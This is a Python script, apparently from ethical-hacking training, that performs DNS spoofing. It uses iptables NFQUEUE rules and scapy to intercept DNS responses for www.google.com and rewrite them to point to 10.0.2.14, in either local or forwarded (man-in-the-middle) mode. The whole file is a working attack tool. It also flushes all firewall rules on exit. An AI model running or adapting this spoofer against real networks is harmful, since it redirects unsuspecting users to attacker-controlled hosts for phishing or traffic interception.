import netfilterqueue
import scapy.all as scapy
import subprocess
import argparse


class Command():

    def __init__(self):

        self.options = self.get_arguments()
        if self.options.target == 'local':
            # local
            subprocess.call(['iptables', '-I', 'OUTPUT', '-j',
                             'NFQUEUE', '--queue-num', '0'])
            subprocess.call(['iptables', '-I', 'INPUT', '-j',
                             'NFQUEUE', '--queue-num', '0'])
        elif self.options.target == 'remote':
            # remote
            subprocess.call(
                ['echo', '1', '>', '/proc/sys/net/ipv4/ip_forward'])
            subprocess.call(['iptables', '-I', 'FORWARD', '-j',
                             'NFQUEUE', '--queue-num', '0'])

    def close(self):
        if self.options.target == 'remote':
            subprocess.call(
                ['echo', '0', '>', '/proc/sys/net/ipv4/ip_forward'])

        subprocess.call(['iptables', '--flush'])

    def get_arguments(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('-t', '--target', dest='target',
                            help='target machine -- specify "local" or "remote"')

        options = parser.parse_args()
        if not options.target:
            parser.error(
                '[-] Please specify a target machine, use --help for more info.')

        return options


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if 'www.google.com' in qname.decode():
            print('[+] Spoofing target')
            answer = scapy.DNSRR(rrname=qname, rdata='10.0.2.14')
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))

    packet.accept()


if __name__ == '__main__':
    cmd = Command()
    try:
        queue = netfilterqueue.NetfilterQueue()
        print(queue)
        queue.bind(0, process_packet)
        queue.run()

    except KeyboardInterrupt:
        print('\riptables --flush')
        cmd.close()
